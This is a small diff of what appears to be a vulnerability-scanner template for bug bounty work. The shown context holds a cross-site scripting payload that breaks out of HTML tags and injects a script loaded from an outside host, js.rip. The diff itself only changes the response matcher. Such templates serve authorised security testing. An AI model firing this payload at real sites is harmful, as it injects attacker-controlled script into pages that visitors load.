@@ -25,9 +25,8 @@ http:
         - "dimka@gmail.com--></noscript></title></textarea></style></template></noembed></script><script src='https://js.rip/bugbounty'></script>"
         
     stop-at-first-match: true
-    matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - "https://js.rip/bugbounty"
+          - "<script src=//js.rip/bugbounty"
